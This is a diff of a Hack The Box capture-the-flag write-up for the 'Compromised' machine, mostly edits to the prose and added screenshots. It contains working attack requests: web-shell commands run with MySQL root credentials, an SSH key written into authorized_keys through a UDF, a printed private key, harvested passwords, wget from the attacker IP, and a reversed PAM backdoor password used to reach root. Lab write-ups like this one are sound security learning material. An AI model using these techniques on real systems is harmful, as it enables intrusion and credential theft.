@@ -12,6 +12,8 @@ description: >-
 
 Short description to include any strange things to be dealt with
 
+TODO: finish writeup, and clean up
+
 ## Useful Skills and Tools
 
 #### Useful thing 1
@@ -524,7 +526,7 @@ Enumerated databases
 
 Listed tables in the `ecom` database.
 
-![](../../.gitbook/assets/11-mysql-code-exec.png)
+![](../../.gitbook/assets/11-mysql-code-exec%20%281%29.png)
 
 got code execution with `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"system+id"+ecom HTTP/1.1`
 
@@ -604,11 +606,15 @@ name    ret    dl    type
 exec_cmd    0    libmysql.so    function
 ```
 
-There was one function stored in the `func` table in the `mysql` database
+There was one function stored in the `func` table in the `mysql` database called `exec_cmd`.  I tried to use this function directly, but id didn't work.  After some trial and error I found out that it had to used together with the `SELECT` SQL command.
+
+![](../../.gitbook/assets/11-mysql-code-exec2.png)
 
 `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('id')"+mysql HTTP/1.1`
 
-From these results I could see that this function was running in the context of the user `mysql`. Since I knew that this user could log in, I tried to insert my SSH public key into their `.ssh/authorized_keys` file so I could login usign SSH
+From these results I could see that this function was running in the context of the user `mysql`. Since I knew that this user could log in, I tried to insert my SSH public key into their `.ssh/authorized_keys` file so I could login using SSH.
+
+![](../../.gitbook/assets/11-mysql-mysql-sshkey.png)
 
 `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('echo+ecdsa-sha2-nistp256+AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLNqKR/rHfuv30j7eOmU85z%2bEKhPfUFtn9WEARBZzwF6LFTCgjZzqAF0GevT3b22Z5iqwETgfF%2bQcmjAw3Ld9VY%3d+>>+~/.ssh/authorized_keys')"+mysql HTTP/1.1`
 
@@ -664,7 +670,7 @@ drwxr-xr-x 24 root root     4096 Sep  9 12:02 ..
 drwxr-x---  2 root sysadmin 4096 Aug 31 03:16 sysadmin
 ```
 
-I was finally able to login as `mysql`, but there was no `user.txt` in site. It looked like I needed to move laterally to `sysadmin` first
+My SSH key injection was sucessfull, and I was able to SSH into the box.  I was able to login as `mysql`, but there was no `user.txt` in sight. It looked like I needed to move laterally to `sysadmin` first.
 
 ```text
 mysql@compromised:~$ cat private_key.pem 
@@ -697,7 +703,7 @@ kr4uBVfsyTeGWCgelq6x7avuTmMFVJn4iUX0czwbiqOOx1y0Fyliog==
 -----END RSA PRIVATE KEY-----
 ```
 
-I exfiltrated the private SSH key so I could log in as needed in the future;
+I exfiltrated the user's private SSH key so I could log in as needed in the future.  \(Why the `mysql` user has a SSH key is a question for another time!\)
 
 ### Finding user creds
 
@@ -708,7 +714,7 @@ server-uuid=4667b165-9145-11ea-aaf7-000c29fa914e
 mysql@compromised:~$ cat strace-log.dat
 ```
 
-I wasnt sure what the strace.log was so I read up a bit
+I wasnt sure what the `strace.log` was, so I did some research.
 
 * [https://www.percona.com/blog/2020/06/30/analyzing-mysql-with-strace/](https://www.percona.com/blog/2020/06/30/analyzing-mysql-with-strace/)
 
@@ -716,11 +722,9 @@ I wasnt sure what the strace.log was so I read up a bit
 
 * [https://stackoverflow.com/questions/568564/how-can-i-view-live-mysql-queries](https://stackoverflow.com/questions/568564/how-can-i-view-live-mysql-queries)
 
-The file had a ton of output, so I filtered it for lines where mysql had been run
+The file had a ton of output, so I filtered it for lines where mysql had been run.
 
 ```text
-mysql@compromised:~$ cat strace-log.dat | mysql
-ERROR 1045 (28000): Access denied for user 'mysql'@'localhost' (using password: NO)
 mysql@compromised:~$ cat strace-log.dat | grep mysql
 22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
 22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
@@ -768,9 +772,7 @@ mysql@compromised:~$ cat strace-log.dat | grep mysql
 22229 03:11:18 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changethis"], 0x55bc62467900 /* 21 vars */) = 0
 ```
 
-It looked like the password had been changed a few times. I took note of each of the passwords to see if any of them had been reused
-
-using the password `3*NLJE32I$Fe` I was able to switch users to `sysadmin`
+It looked like the password had been changed a few times. I took note of each of the passwords to see if any of them had been reused.  Using the password `3*NLJE32I$Fe` I was able to switch users to `sysadmin`.
 
 ### User.txt
 
@@ -801,7 +803,7 @@ sudo: unable to resolve host compromised: Resource temporarily unavailable
 Sorry, user sysadmin may not run sudo on compromised.
 ```
 
-couln't use sudo as `sysadmin`
+The user `sysadmin` was not able to use `sudo`.  \(What kind of sysadmin is this?\)
 
 ```text
 sysadmin@compromised:/dev/shm$ wget http://10.10.15.98/linpeas.sh
@@ -818,7 +820,7 @@ ping: sendmsg: Operation not permitted
 sysadmin@compromised:/dev/shm$
 ```
 
-also couldn't connect back to my machine. I thought about base64 copy-pasta, bu after an "Oh duh!" moment, I remembered that I was able to SSH in, and therefore could use that or...SCP to get files in.
+I was unable to ping my computer, so I was worried that I wouldn't be able to connect back to my machine. I thought about using base64 "copy-pasta" to transfer files, but after an "Oh duh!" moment I remembered that I was able to SSH in, and therefore could use SCP to get files in.
 
 ```text
 ┌──(zweilos㉿kali)-[~]
@@ -827,9 +829,9 @@ sysadmin@10.10.10.207's password:
 linpeas.sh                                                            100%  286KB 435.1KB/s   00:00
 ```
 
-Unfortunately, even awesome automated tools like linpeas can only get you so much information. In this case, it didn't supply me with much of anything to go off, so I decided to do a bit more manual enumeration.
+Unfortunately, even awesome automated tools like `linpeas.sh` can only get you so much information. In this case, it didn't supply me with much of anything to go off, so I decided to do a bit more manual enumeration.
 
-First I searched for obvious misconfigurations in sshd other /etc config files, but nothing very interesting there, then looked for
+First I searched for obvious misconfigurations in `sshd` and other `/etc` configuration files but found nothing very interesting.  Next I used the `find` command to search for hidden files.
 
 ```text
 sysadmin@compromised:/dev/shm$ find / -type f -iname ".*" -ls 2>/dev/null
@@ -859,13 +861,13 @@ sysadmin@compromised:/dev/shm$ find / -type f -iname ".*" -ls 2>/dev/null
      8708      0 -rw-r--r--   1 landscape landscape        0 Feb  3  2020 /var/lib/landscape/.cleanup.user
 ```
 
-There were a lot of hidden files, but one that stuck out was
+There were a lot of hidden files, but one that stuck out was the file:
 
 ```text
 -rw-r--r--   1 root     root       198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/.pam_unix.so
 ```
 
-PAM is the pluggable authentication module, and is what controls IAM for linux machines. This shouldn't be a hidden file
+PAM is the pluggable authentication module, and is what controls IAM for Linux machines. This shouldn't be a hidden file.
 
 ```text
 sysadmin@compromised:/lib/x86_64-linux-gnu/security$ ls -la
@@ -921,7 +923,7 @@ drwxr-xr-x 4 root root  12288 Jul 16 19:36 ..
 -rw-r--r-- 1 root root  18848 Feb 27  2019 pam_xauth.so
 ```
 
-Even more suspicious was the fact that though pam\_unix.so and the hidden one were the same filesize and same modify date, the modify date was very different from the reset of the files here.
+It was very suspicious that there were two versions of this file here, with one hidden.  Even more suspicious was the fact that though `pam_unix.so` and the hidden version were the same file size and had the same modify date, thedate was very different from the reset of the files here.
 
 ```text
 sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings .pam_unix.so | less
@@ -933,7 +935,13 @@ sysadmin@compromised:/lib/x86_64-linux-gnu/security$ diff /dev/shm/pam /dev/shm/
 
 After doing some basic analysis with strings and finding nothing, I copied the files back to my machine with SCP to look a bit deeper.
 
+### Using Ghidra for binary analysis
+
+![](../../.gitbook/assets/12-ghidra-little-endian.png)
+
 I opened the file in ghidra and started browsing through the code. Luckily the file was compiled with symbols and strings intact, which made browsing through the code much easier.
+
+![](../../.gitbook/assets/12-ghidra-backdoor.png)
 
 ```c
   iVar2 = pam_get_user(pamh,&name,0);
@@ -961,7 +969,7 @@ E3U~eklz
 -2m28vn
 ```
 
-Based on the code in the assembly view, it looked like these two strings were concatenated to make the backdoor password. It then uses strcmp to compare the backdoor password to the input password and allows authentication if they match. It didn't hurt to try!
+Based on the code in the assembly view, it looked like these two strings were concatenated to make the backdoor password. It then uses `strcmp` to compare the backdoor password to the input password and allows authentication if they match. It didn't hurt to try!
 
 It didn't work for switching users to root, but when looking at the code I had a thought. It said earlier that the code was little-endian, so...maybe the strings were backwards?
 
@@ -973,6 +981,8 @@ zlke~U3E
 └─$ echo '0x2d326d3238766e' | xxd -r | rev  
 nv82m2-
 ```
+
+I combined the two halves of the password and tried to switch users to `root`.  
 
 ### Getting a shell
 
@@ -987,7 +997,7 @@ uid=0(root) gid=0(root) groups=0(root)
 compromised
 ```
 
-And that was it!
+And that was it! I was logged in as root.
 
 ### Root.txt
 
@@ -996,9 +1006,11 @@ root@compromised:~# cat root.txt
 5ecdcd0bab29ab67d325c26ed9deaec7
 ```
 
+After that it was a simple matter to collect my proof!
+
 ![](../../.gitbook/assets/0-compromised-pwned.png)
 
-Thanks to [`D4nch3n`](https://app.hackthebox.eu/users/103781) for something interesting or useful about this machine.
+Thanks to [`D4nch3n`](https://app.hackthebox.eu/users/103781) for... \[something interesting or useful about this machine.\]
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
 
